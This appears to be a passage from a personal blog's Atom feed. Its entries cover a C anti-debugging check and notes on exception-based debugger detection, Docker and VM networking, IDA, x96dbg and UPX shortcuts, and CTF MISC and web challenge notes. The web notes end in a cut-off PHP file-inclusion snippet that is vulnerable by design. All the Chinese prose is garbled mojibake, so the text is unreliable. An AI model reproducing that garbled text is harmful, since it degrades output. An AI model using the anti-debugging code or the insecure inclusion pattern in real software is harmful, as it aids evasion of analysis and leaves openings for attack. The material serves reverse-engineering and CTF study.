ç»“æ„ä½“ä¸­ä¸ç”¨çš„å­—æ®µæ¥åˆ¤æ–­ç¨‹åºæ˜¯å¦åœ¨è¢«è°ƒè¯•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">STARTUPINFO si;</span><br><span class="line">GetStartupInfo(&amp;si);</span><br><span class="line"><span class="keyword">if</span> (si.dwX != <span class="number">0</span> || si.dwY != <span class="number">0</span> || si.dwFillAttribute != <span class="number">0</span> || si.dwXSize != <span class="number">0</span> ||</span><br><span class="line">si.dwYSize != <span class="number">0</span> || si.dwXCountChars != <span class="number">0</span> || si.dwYCountChars != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åŸºäºå¼‚å¸¸çš„åè°ƒè¯•"><a href="#åŸºäºå¼‚å¸¸çš„åè°ƒè¯•" class="headerlink" title="åŸºäºå¼‚å¸¸çš„åè°ƒè¯•"></a><strong>åŸºäºå¼‚å¸¸çš„åè°ƒè¯•</strong></h4><p>è¿›ç¨‹ä¸­å‘ç”Ÿå¼‚å¸¸æ—¶è‹¥ SEH æœªå¤„ç†æˆ–æ³¨å†Œçš„ SEH ä¸å­˜åœ¨ï¼Œä¼šè°ƒç”¨ UnhandledExceptionFilter ï¼Œå®ƒä¼šè¿è¡Œç³»ç»Ÿæœ€åçš„å¼‚å¸¸å¤„ç†å™¨ã€‚ UnhandledExceptionFilter å†…éƒ¨è°ƒç”¨äº†å‰é¢æåˆ°è¿‡çš„NtQueryInformationProcess ä»¥åˆ¤æ–­è¿›ç¨‹æ˜¯å¦æ­£åœ¨è¢«è°ƒè¯•ã€‚</p><p>è‹¥è¿›ç¨‹æœªè¢«è°ƒè¯•ï¼Œåˆ™è¿è¡Œæœ€åçš„å¼‚å¸¸å¤„ç†å™¨ã€‚è‹¥è¿›ç¨‹å¤„äºè°ƒè¯•çŠ¶æ€ï¼Œåˆ™å°†å¼‚å¸¸æ´¾é€ç»™è°ƒè¯•å™¨ã€‚</p><p>SetUnhandledExceptionFilter å‡½æ•°å¯ä»¥ä¿®æ”¹ç³»ç»Ÿæœ€åçš„å¼‚å¸¸å¤„ç†å™¨ã€‚</p><h4 id="Debug-Block"><a href="#Debug-Block" class="headerlink" title="Debug Block"></a><strong>Debug Block</strong></h4><p>Debug Block æ˜¯æŒ‡åœ¨éœ€è¦ä¿æŠ¤çš„ç¨‹åºä¸­ï¼Œç¨‹åºè‡ªèº«å°†ä¸€äº›åªèƒ½åŒæ—¶æœ‰ 1 ä¸ªå®ä¾‹çš„åŠŸèƒ½å ä¸ºå·±ç”¨ã€‚æ¯”å¦‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªè¿›ç¨‹åªèƒ½åŒæ—¶è¢« 1 ä¸ªè°ƒè¯•å™¨è°ƒè¯•ï¼Œé‚£ä¹ˆå°±å¯ä»¥è®¾è®¡ä¸€ç§æ¨¡å¼ï¼Œå°†ç¨‹åºä»¥è°ƒè¯•æ–¹å¼å¯åŠ¨ï¼Œç„¶ååˆ©ç”¨ç³»ç»Ÿçš„è°ƒè¯•æœºåˆ¶é˜²æ­¢è¢«å…¶ä»–è°ƒè¯•å™¨è°ƒè¯•ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;èŠ±æŒ‡ä»¤-amp-åè°ƒè¯•&quot;&gt;&lt;a href=&quot;#èŠ±æŒ‡ä»¤-amp-åè°ƒè¯•&quot; class=&quot;headerlink&quot; title=&quot;èŠ±æŒ‡ä»¤&amp;amp;åè°ƒè¯•&quot;&gt;&lt;/a&gt;èŠ±æŒ‡ä»¤&amp;amp;åè°ƒè¯•&lt;/h1&gt;&lt;p&gt;2024&amp;#x2F;01&amp;#x2F;17&lt;/p&gt;
&lt;p&gt;å¥½ï¼Œåšé“up</summary>
      
    
    
    
    
    <category term="èŠ±æŒ‡ä»¤ é€†å‘å­¦ä¹  åè°ƒè¯•" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4-%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>å¯„ç½‘</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/18/%E7%AE%80%E5%8D%95%E5%AF%84%E7%BD%91/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/18/%E7%AE%80%E5%8D%95%E5%AF%84%E7%BD%91/</id>
    <published>2024-01-17T16:00:00.000Z</published>
    <updated>2024-01-19T09:06:48.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Dockerç½‘ç»œæ¨¡å¼Linux-Bridge-Host-None"><a href="#Dockerç½‘ç»œæ¨¡å¼Linux-Bridge-Host-None" class="headerlink" title="Dockerç½‘ç»œæ¨¡å¼Linux-Bridge|Host|None"></a>Dockerç½‘ç»œæ¨¡å¼Linux-Bridge|Host|None</h2><p> å¦‚æœå‡è®¾Linuxæ˜¯å®¿ä¸»ï¼Œæœ‰ä¸€ä¸ªenp0s3çš„ä»¥å¤ªç½‘æ¥å£ï¼Œå½“æœ‰äº†dockeråï¼Œä¼šå¤šä¸€ä¸ªdocker0æ¥å£ï¼Œè¿™ä¸ªdocker0æ˜¯é»˜è®¤Brigadeç½‘ç»œçš„ç½‘å…³ï¼Œå®¹å™¨çš„æ•°æ®è¦å‡ºå»éœ€è¦ç»è¿‡docker0ã€‚</p><p>å¦‚æœåˆ›å»ºæ–°çš„æ¨¡å¼ï¼ˆeth0ï¼‰ï¼Œä¼šé»˜è®¤åŠ å…¥è¿™ä¸ªdocker0ç½‘ç»œé‡Œï¼Œæ­¤æ—¶docker0ä¸‹é¢ä¼šå¤šäº†ä¸€ä¸ªé™„å±çš„æ¥å£ï¼Œå¹¶ä¸”é€šè¿‡vethçš„æ–¹å¼å’Œå®¹å™¨çš„eth0æ¥å£è¿›è¡Œè¿æ¥ï¼Œå¦‚æœæœ‰æ–°çš„å®¹å™¨ä¹Ÿæ˜¯ä¼šå‘ç”ŸåŒæ ·çš„äº‹æƒ…ï¼Œè¿™ä¸ªç½‘ç»œæ¨¡å¼å«åšBridgeï¼›è€Œâ€œæ¡¥â€å°±æ˜¯docker0ï¼Œvethå¯ä»¥æƒ³è±¡ä¸ºå®¹å™¨å„è‡ªé€šå¾€æ¡¥çš„è·¯ï¼Œæ­£å› ä¸ºæœ‰docker0è¿™åº§æ¡¥ï¼Œå®¹å™¨é‡Œçš„æ•°æ®æ‰å¯ä»¥æŠµè¾¾å®¿ä¸»çš„enp0s3æ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´å®¹å™¨æ˜¯å¯ä»¥è®¿é—®å¤–éƒ¨ç½‘ç»œçš„ã€‚</p><p>åœ¨Bridgeç½‘ç»œä¸­ï¼Œå¯ä»¥è¿›è¡Œå®¹å™¨é—´ã€å®¹å™¨ä¸å®¿ä¸»é—´ï¼Œå®¹å™¨å‘äº’è”ç½‘çš„è®¿é—®ï¼Œä½†æ˜¯äº’è”ç½‘-&gt;å®¹å™¨éœ€è¦ç«¯å£å…³è”</p><table><thead><tr><th></th><th>é»˜è®¤Bridge</th><th>è‡ªå®šä¹‰Bridge</th><th>Host</th><th>None</th></tr></thead><tbody><tr><td>ä¼˜ç‚¹</td><td>è‡ªåŠ¨åŠ å…¥</td><td>è‡ªåŠ¨DNSéš”ç¦»</td><td>ç½‘ç»œæ€§èƒ½ä½³</td><td>éš”ç¦»</td></tr><tr><td>ç¼ºç‚¹</td><td>æ— è‡ªåŠ¨DNS</td><td>NAT</td><td>å®‰å…¨é—®é¢˜<br />ä»…Linux</td><td>ä¸èƒ½è”ç½‘</td></tr><tr><td>åœºæ™¯</td><td>ä¸å»ºè®®</td><td>å•å®¿ä¸»å¤šå®¹å™¨</td><td>å•å®¹å™¨å¤šç«¯å£</td><td>å¤‡ä»½<br />ä¸€æ¬¡æ€§æ“ä½œ</td></tr></tbody></table><h2 id="ã€è™šæ‹Ÿæœºç½‘ç»œæ¨¡å¼ã€‘NAT-NATç½‘ç»œ-æ¡¥æ¥Bridged-å†…éƒ¨ç½‘ç»œInternal-ä»…ä¸»æœº-Host-Only"><a href="#ã€è™šæ‹Ÿæœºç½‘ç»œæ¨¡å¼ã€‘NAT-NATç½‘ç»œ-æ¡¥æ¥Bridged-å†…éƒ¨ç½‘ç»œInternal-ä»…ä¸»æœº-Host-Only" class="headerlink" title="ã€è™šæ‹Ÿæœºç½‘ç»œæ¨¡å¼ã€‘NAT | NATç½‘ç»œ | æ¡¥æ¥Bridged | å†…éƒ¨ç½‘ç»œInternal | ä»…ä¸»æœº(Host-Only)"></a>ã€è™šæ‹Ÿæœºç½‘ç»œæ¨¡å¼ã€‘NAT | NATç½‘ç»œ | æ¡¥æ¥Bridged | å†…éƒ¨ç½‘ç»œInternal | ä»…ä¸»æœº(Host-Only)</h2><p>ping çš„å®è´¨ï¼šå‘é€ä¸€ä¸ªicmpå›æ˜¾è¯·æ±‚æŠ¥æ–‡ç»™ç›®çš„çš„ä¸»æœºï¼Œå¹¶ç­‰å¾…å›æ˜¾çš„icmpåº”ç­”ã€‚ç„¶åæ‰“å°å‡ºå›æ˜¾æŠ¥æ–‡ã€‚</p><p>å›æ˜¾çš„ç»“æœåŒ…æ‹¬ï¼šå­—èŠ‚æ•°  ã€ ååº”æ—¶é—´ã€TTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰</p><p>Tracert çš„å®è´¨ï¼šåˆ©ç”¨ICMPæ•°æ®æŠ¥å’ŒIPæ•°æ®æŠ¥å¤´éƒ¨ä¸­çš„TTLå€¼ã€‚TTLï¼ˆTime To Liveï¼‰æ˜¯ä¸€ä¸ªIPæ•°æ®æŠ¥çš„ç”Ÿå­˜æ—¶é—´ï¼Œå½“æ¯ä¸ªIPæ•°æ®æŠ¥ç»è¿‡è·¯ç”±å™¨çš„æ—¶å€™éƒ½å›æŠŠTTLå€¼å‡å»1æˆ–è€…å‡å»åœ¨è·¯ç”±å™¨ä¸­åœç•™çš„æ—¶é—´ï¼Œä½†æ˜¯å¤§å¤šæ•°æ•°æ®æŠ¥åœ¨è·¯ç”±å™¨ä¸­åœç•™çš„æ—¶é—´éƒ½å°äº1ç§’ç§ï¼Œå› æ­¤å®é™…ä¸Šå°±æ˜¯åœ¨TTLå€¼å‡å»äº†1ã€‚è¿™æ ·ï¼ŒTTLå€¼å°±ç›¸å½“äºä¸€ä¸ªè·¯ç”±å™¨çš„è®¡æ•°å™¨ã€‚<br>å½“è·¯ç”±å™¨æ¥æ”¶åˆ°ä¸€ä¸ªTTLä¸º0æˆ–è€…1çš„IPæ•°æ®æŠ¥çš„æ—¶å€™ï¼Œè·¯ç”±å™¨å°±ä¸å†è½¬å‘è¿™ä¸ªæ•°æ®äº†ï¼Œè€Œç›´æ¥ä¸¢å¼ƒï¼Œå¹¶ä¸”å‘é€ä¸€ä¸ªICMPâ€œè¶…æ—¶â€ä¿¡æ¯ç»™æºä¸»æœºã€‚Tracertç¨‹åºçš„å…³é”®å°±æ˜¯è¿™ä¸ªå›æ˜¾çš„ICMPæŠ¥æ–‡çš„IPæŠ¥å¤´çš„ä¿¡æºåœ°å€å°±æ˜¯è¿™ä¸ªè·¯ç”±å™¨çš„IPåœ°å€ã€‚åŒæ—¶ï¼Œå¦‚æœåˆ°è¾¾äº†ç›®çš„ä¸»æœºï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½çŸ¥é“ï¼Œäºæ˜¯ï¼ŒTracertè¿˜åŒæ—¶å‘é€ä¸€ä¸ªUDPä¿¡æ¯ç»™ç›®çš„ä¸»æœºï¼Œå¹¶ä¸”é€‰æ‹©ä¸€ä¸ªå¾ˆå¤§çš„å€¼ä½œä¸ºUDPçš„ç«¯å£ï¼Œä½¿ä¸»æœºçš„ä»»ä½•ä¸€ä¸ªåº”ç”¨ç¨‹åºéƒ½ä¸ä½¿ç”¨è¿™ä¸ªç«¯å£ã€‚æ‰€ä»¥ï¼Œå½“è¾¾åˆ°ç›®çš„ä¸»æœºçš„æ—¶å€™ï¼ŒUDPæ¨¡å—å°±äº§ç”Ÿä¸€ä¸ªâ€œç«¯å£ä¸å¯åˆ°è¾¾â€çš„é”™è¯¯ï¼Œè¿™æ ·å°±èƒ½åˆ¤æ–­æ˜¯å¦æ˜¯åˆ°è¾¾ç›®çš„åœ°äº†ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/u013078669/article/details/48437559">https://blog.csdn.net/u013078669/article/details/48437559</a></p><p><a href="http://t.csdnimg.cn/tx3ql">http://t.csdnimg.cn/tx3ql</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Dockerç½‘ç»œæ¨¡å¼Linux-Bridge-Host-None&quot;&gt;&lt;a href=&quot;#Dockerç½‘ç»œæ¨¡å¼Linux-Bridge-Host-None&quot; class=&quot;headerlink&quot; title=&quot;Dockerç½‘ç»œæ¨¡å¼Linux-Bridge|Host|</summary>
      
    
    
    
    
    <category term="è®¡ç®—æœºç½‘ç»œ" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸ç”¨å‘½ä»¤/å¿«æ·æ–¹å¼</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/16/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/16/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</id>
    <published>2024-01-15T16:00:00.000Z</published>
    <updated>2024-02-20T13:21:38.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¸¸ç”¨å‘½ä»¤-x2F-å¿«æ·æ–¹å¼"><a href="#å¸¸ç”¨å‘½ä»¤-x2F-å¿«æ·æ–¹å¼" class="headerlink" title="å¸¸ç”¨å‘½ä»¤&#x2F;å¿«æ·æ–¹å¼"></a>å¸¸ç”¨å‘½ä»¤&#x2F;å¿«æ·æ–¹å¼</h1><h2 id="IDAï¼š"><a href="#IDAï¼š" class="headerlink" title="IDAï¼š"></a>IDAï¼š</h2><h3 id="é™æ€è°ƒè¯•"><a href="#é™æ€è°ƒè¯•" class="headerlink" title="é™æ€è°ƒè¯•"></a>é™æ€è°ƒè¯•</h3><p>äº¤å‰å¼•ç”¨ï¼šX</p><p>åœ°å€è·³è½¬ï¼šG</p><p>ä¹¦å†™æ³¨é‡Šï¼š&#x2F;ï¼ˆä¼ªä»£ç ï¼‰ ï¼›ï¼ˆåç¼–è¯‘çª—å£ï¼‰</p><p>ä¿®æ”¹ç¬¦å·åï¼šN</p><p>æ•°æ®ç±»å‹æ“ä½œï¼šY</p><p>ä¿®æ”¹æ•°æ®é•¿åº¦ï¼šD</p><p>å‡½æ•°æ“ä½œï¼š  </p><ul><li>å®šä¹‰å‡½æ•°ï¼šP</li><li>åˆ é™¤å‡½æ•°ï¼šDelete&#x2F;U</li><li>ä¿®æ”¹å‡½æ•°èŒƒå›´ï¼šCtrl+Eï¼ˆå‡½æ•°çª—å£ï¼‰ Alt+Pï¼ˆåæ±‡ç¼–ï¼‰</li></ul><p>ä»£ç ä¸æ•°æ®è½¬æ¢ï¼š</p><ul><li>Uå–æ¶ˆå·²æœ‰æ•°æ®</li><li>Då˜æˆæ•°æ®</li><li>Cå˜æˆæŒ‡ä»¤</li><li>Aä»¥è¯¥ä½ç½®ä¸ºèµ·ç‚¹å®šä¹‰ä¸€ä¸ªä»¥\0ç»“å°¾çš„å­—ç¬¦ä¸²ç±»å‹</li><li>Oå°†æ­¤å¤„å®šä¹‰ä¸ºä¸€ä¸ªåœ°å€åç§»</li></ul><p>åˆ›å»ºæ•°ç»„ï¼š* </p><p>åˆ›å»ºç»“æ„ä½“ï¼šShift+f1â€“local typesâ€“insert</p><p>æå–æ•°æ®ï¼šshift+E</p><p>å‡½æ•°è°ƒç”¨å›¾ï¼šViewâ€“Graphsâ€“Function calls</p><p>å¸¸æ•°æœç´¢ï¼šAlt+I</p><p>Patchï¼šEdit -&gt; Patch program -&gt; Change byte</p><p>è¦æ°¸ä¹… Patchï¼Œ Edit -&gt; Patch program -&gt; Apply patches to input file</p><h3 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h3><p>é€‰æ‹© Debugger -&gt; Select debuggerï¼Œé€‰æ‹©åˆé€‚çš„è°ƒè¯•å™¨ï¼š</p><p>å¦‚æœæ˜¯ exeï¼Œå¯ä»¥ä½¿ç”¨ Local Windows Debugger</p><p>å¦‚æœæ˜¯ ELFï¼Œ åˆ™é€‰æ‹© Remote Linux Debugger</p><p>é€‰æ‹© Debuugger -&gt; Start Process æˆ–è€…æŒ‰ F9 å¼€å§‹è°ƒè¯•ã€‚</p><ul><li>ç»§ç»­è¿è¡Œï¼šF9</li><li>å•æ­¥æ­¥å…¥ï¼šF7</li><li>å•æ­¥æ­¥è¿‡ï¼šF8</li><li>æ‰§è¡Œåˆ°è¿”å›ï¼šCtrl +F7</li><li>æ‰§è¡Œåˆ°å…‰æ ‡å¤„ï¼šF4</li><li>æ·»åŠ ã€åˆ é™¤æ–­ç‚¹ï¼šF2</li></ul><p>Ctrl+Alt+B æ‰“å¼€æ–­ç‚¹åˆ—è¡¨</p><p>Ctrl+E è¿›è¡Œç¼–è¾‘</p><p>F2æ”¹å†…å­˜æ•°æ®</p><p>é€‰æ‹©äº†è°ƒè¯•å™¨ä¹‹åï¼Œæ‰“å¼€ Debugger -&gt; Process optionsï¼Œåœ¨ Parameters ä¸€æ å†™å…¥å‘½ä»¤è¡Œå‚æ•°å³å¯ã€‚</p><h2 id="x96dbg"><a href="#x96dbg" class="headerlink" title="x96dbg"></a>x96dbg</h2><h3 id="å¸¸ç”¨è°ƒè¯•å¿«æ·é”®ï¼š"><a href="#å¸¸ç”¨è°ƒè¯•å¿«æ·é”®ï¼š" class="headerlink" title="å¸¸ç”¨è°ƒè¯•å¿«æ·é”®ï¼š"></a>å¸¸ç”¨è°ƒè¯•å¿«æ·é”®ï¼š</h3><ul><li>F4ï¼šè¿è¡Œåˆ°å…‰æ ‡</li><li>F7ï¼šå•æ­¥æ­¥å…¥</li><li>F8ï¼šå•æ­¥æ­¥è¿‡</li><li>F9ï¼šè¿è¡Œç¨‹åº</li><li>Ctrl+F9ï¼šæ‰§è¡Œåˆ°å‡½æ•°è¿”å›å¤„</li></ul><h2 id="UPXå·¥å…·å£³"><a href="#UPXå·¥å…·å£³" class="headerlink" title="UPXå·¥å…·å£³"></a>UPXå·¥å…·å£³</h2><p>åŠ å£³upx -o packed.exe xxx.exe</p><p>è„±å£³upx -d xxx.exe</p><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p>ç°åœ¨ï¼Œä½ çŸ¥é“å¦‚ä½•åœ¨ <em>Insert</em> å’Œ <em>Normal</em> æ¨¡å¼ä¸‹åˆ‡æ¢äº†ã€‚ä¸‹é¢æ˜¯ä¸€äº›å‘½ä»¤ï¼Œå¯ä»¥è®©ä½ åœ¨ <em>Normal</em> æ¨¡å¼ä¸‹å¹¸å­˜ä¸‹æ¥ï¼š</p><blockquote><ul><li><code>i</code> â†’ <em>Insert</em> æ¨¡å¼ï¼ŒæŒ‰ <code>ESC</code> å›åˆ° <em>Normal</em> æ¨¡å¼.</li><li><code>x</code> â†’ åˆ å½“å‰å…‰æ ‡æ‰€åœ¨çš„ä¸€ä¸ªå­—ç¬¦ã€‚</li><li><code>:wq</code> â†’ å­˜ç›˜ + é€€å‡º (<code>:w</code> å­˜ç›˜, <code>:q</code> é€€å‡º)  ï¼ˆé™ˆçš“æ³¨ï¼š:w åå¯ä»¥è·Ÿæ–‡ä»¶åï¼‰</li><li><code>dd</code> â†’ åˆ é™¤å½“å‰è¡Œï¼Œå¹¶æŠŠåˆ é™¤çš„è¡Œå­˜åˆ°å‰ªè´´æ¿é‡Œ</li><li><code>p</code> â†’ ç²˜è´´å‰ªè´´æ¿</li></ul><p><strong>æ¨è</strong>:</p><ul><li><code>hjkl</code> (å¼ºä¾‹æ¨èä½¿ç”¨å…¶ç§»åŠ¨å…‰æ ‡ï¼Œä½†ä¸å¿…éœ€) â†’ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…‰æ ‡é”® (â†â†“â†‘â†’). æ³¨: <code>j</code> å°±åƒä¸‹ç®­å¤´ã€‚</li><li><code>:help &lt;command&gt;</code> â†’ æ˜¾ç¤ºç›¸å…³å‘½ä»¤çš„å¸®åŠ©ã€‚ä½ ä¹Ÿå¯ä»¥å°±è¾“å…¥ <code>:help</code> è€Œä¸è·Ÿå‘½ä»¤ã€‚ï¼ˆé™ˆçš“æ³¨ï¼šé€€å‡ºå¸®åŠ©éœ€è¦è¾“å…¥:qï¼‰</li></ul></blockquote><p>sudo su ç‚’é¸¡</p><p>reboot é‡å¯</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br><span class="line">#æŸ¥çœ‹é•œåƒ</span><br><span class="line">docker run -d [images_name/id] /bin/bash</span><br><span class="line">#runï¼šè¿è¡Œ é•œåƒ ä»è€Œç”Ÿæˆ å®¹å™¨; -dï¼šåå°è¿è¡Œå®¹å™¨; [images_name/id]ï¼šæ¢æˆé•œåƒçš„idæˆ–è€…åç§°; /bin/bashï¼šè¿è¡Œé•œåƒçš„æƒé™</span><br><span class="line">docker ps</span><br><span class="line">#æŸ¥çœ‹åœ¨è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker ps -a</span><br><span class="line">#æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</span><br><span class="line">docker exec -it [container-id] /bin/bash</span><br><span class="line">#è¿›å…¥å®¹å™¨; exec:åœ¨è¿è¡Œçš„å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤; -i:äº’äº¤ç•Œé¢, -t:åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯; container-id:æ¢æˆå®¹å™¨id</span><br><span class="line">docker rm [container-id]</span><br><span class="line">#åˆ é™¤å®¹å™¨</span><br><span class="line">docker rmi [images-name]</span><br><span class="line">#åˆ é™¤é•œåƒ</span><br></pre></td></tr></table></figure><p>1181 1748 300</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¸¸ç”¨å‘½ä»¤-x2F-å¿«æ·æ–¹å¼&quot;&gt;&lt;a href=&quot;#å¸¸ç”¨å‘½ä»¤-x2F-å¿«æ·æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;å¸¸ç”¨å‘½ä»¤&amp;#x2F;å¿«æ·æ–¹å¼&quot;&gt;&lt;/a&gt;å¸¸ç”¨å‘½ä»¤&amp;#x2F;å¿«æ·æ–¹å¼&lt;/h1&gt;&lt;h2 id=&quot;IDAï¼š&quot;&gt;&lt;a href=&quot;#IDA</summary>
      
    
    
    
    
    <category term="å‘½ä»¤ å¿«æ·" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E5%91%BD%E4%BB%A4-%E5%BF%AB%E6%8D%B7/"/>
    
  </entry>
  
  <entry>
    <title>2024å¯’å‡MISCå°è®°å½•_æ›´0130</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/15/2024%E5%AF%92%E5%81%87MISC%E5%B0%8F%E8%AE%B0%E5%BD%95/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/15/2024%E5%AF%92%E5%81%87MISC%E5%B0%8F%E8%AE%B0%E5%BD%95/</id>
    <published>2024-01-14T16:00:00.000Z</published>
    <updated>2024-03-02T08:37:52.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISCMISCï¼"><a href="#MISCMISCï¼" class="headerlink" title="MISCMISCï¼"></a>MISCMISCï¼</h1><h2 id="2024-x2F-01-x2F-14"><a href="#2024-x2F-01-x2F-14" class="headerlink" title="2024&#x2F;01&#x2F;14"></a>2024&#x2F;01&#x2F;14</h2><h3 id="ç­¾åˆ°å–µï¼š"><a href="#ç­¾åˆ°å–µï¼š" class="headerlink" title="ç­¾åˆ°å–µï¼š"></a>ç­¾åˆ°å–µï¼š</h3><p>pythonåº“å‡½æ•°ï¼Œå–µè¯­</p><h3 id="åŠ å¯†-A-å®½å®½-S-00-Eï¼š"><a href="#åŠ å¯†-A-å®½å®½-S-00-Eï¼š" class="headerlink" title="åŠ å¯† A å®½å®½ S 00 Eï¼š"></a>åŠ å¯† A å®½å®½ S 00 Eï¼š</h3><p>é›¶å®½å­—èŠ‚ï¼ŒASEåŠ å¯† </p><h3 id="æ˜¯uuå—ï¼š"><a href="#æ˜¯uuå—ï¼š" class="headerlink" title="æ˜¯uuå—ï¼š"></a>æ˜¯uuå—ï¼š</h3><p>uuencodeï¼Œsteghide ï¼ˆæ„Ÿè§‰è¿™å‡ ä¸ªéšå†™å·¥å…·éƒ½å¾—ç­›ä¸€æ¬¡å•Šï¼ˆæ‚²</p><h3 id="æœºå¯†ï¼š"><a href="#æœºå¯†ï¼š" class="headerlink" title="æœºå¯†ï¼š"></a>æœºå¯†ï¼š</h3><p>æ–‡ä»¶éšè—ï¼Œçˆ†ç ´ </p><h3 id="EZç­¾åˆ°ï¼š"><a href="#EZç­¾åˆ°ï¼š" class="headerlink" title="EZç­¾åˆ°ï¼š"></a>EZç­¾åˆ°ï¼š</h3><p>ä¼ªåŠ å¯†ï¼Œimagemagickï¼Œgapsï¼Œf5åŠ å¯†ï¼Œbaseå®¶æ— ï¼ˆezï¼‰ï¼‰</p><h3 id="ç¤¾ä¼šä¸»ä¹‰å¥½ï¼š"><a href="#ç¤¾ä¼šä¸»ä¹‰å¥½ï¼š" class="headerlink" title="ç¤¾ä¼šä¸»ä¹‰å¥½ï¼š"></a>ç¤¾ä¼šä¸»ä¹‰å¥½ï¼š</h3><p>æ ¸å¿ƒä»·å€¼è§‚è§£ç ï¼Œrabbitè§£ç </p><h2 id="2024-x2F-01-x2F-15"><a href="#2024-x2F-01-x2F-15" class="headerlink" title="2024&#x2F;01&#x2F;15"></a>2024&#x2F;01&#x2F;15</h2><h3 id="ç­¾åˆ°ï¼ˆwebæ··å…¥ï¼‰"><a href="#ç­¾åˆ°ï¼ˆwebæ··å…¥ï¼‰" class="headerlink" title="ç­¾åˆ°ï¼ˆwebæ··å…¥ï¼‰"></a>ç­¾åˆ°ï¼ˆwebæ··å…¥ï¼‰</h3><p><strong>å…ƒç´ ååº”</strong></p><p>çœ‹åˆ°æäº¤æŒ‰é’®ä¸èƒ½ç”¨ï¼Œå…ˆæŠŠå…ƒç´ é‡Œçš„disabledå˜æˆabledç‚¹å‡»è¯•è¯•ï¼Œå¼¹æ¡†ï¼š</p><blockquote><p>å°ç«æ±æäº¤â€œilovejljcxyâ€å°±èƒ½çš„åˆ°flagäº†å•Š</p></blockquote><p>è¾“å…¥æ¡†åªèƒ½è¾“å…¥9ä½ï¼Œæ”¹æˆ11ä½ï¼Œæäº¤â€ilovejljcxyâ€œï¼Œå¾—åˆ°flag</p><h3 id="ç­¾åˆ°é¢˜ï¼ˆwebå†æ··å…¥ï¼‰"><a href="#ç­¾åˆ°é¢˜ï¼ˆwebå†æ··å…¥ï¼‰" class="headerlink" title="ç­¾åˆ°é¢˜ï¼ˆwebå†æ··å…¥ï¼‰"></a>ç­¾åˆ°é¢˜ï¼ˆwebå†æ··å…¥ï¼‰</h3><p><strong>cookie ç»•è¿‡</strong></p><p>çœ‹cookieï¼Œdidi&#x3D;noï¼Œç”¨Editthiscookieæ’ä»¶æ”¹ä¸€ä¸‹yesï¼Œåˆ·æ–°å¾—</p><p>Li9kYXRhL2luZGV4LnBocAï¼ˆè¡¥å…¨&#x3D;&#x3D;åï¼‰è§£å¯†.&#x2F;data&#x2F;index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    